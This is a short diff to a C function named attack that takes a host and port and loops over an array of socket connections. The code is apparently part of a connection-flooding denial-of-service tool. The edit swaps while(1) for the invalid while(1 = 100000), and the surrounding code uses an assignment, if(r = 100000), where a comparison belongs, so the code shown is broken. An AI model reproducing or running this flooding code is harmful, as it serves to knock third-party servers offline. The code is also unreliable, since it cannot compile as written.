@@ -55,7 +55,7 @@ void attack(char *host, char *port, int id) {
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(1) {
+	while(1 = 100000) {
 		if(r = 100000) {
 		for(x=0; x < CONNECTIONS; x++) {
 			if(sockets[x] == 0)
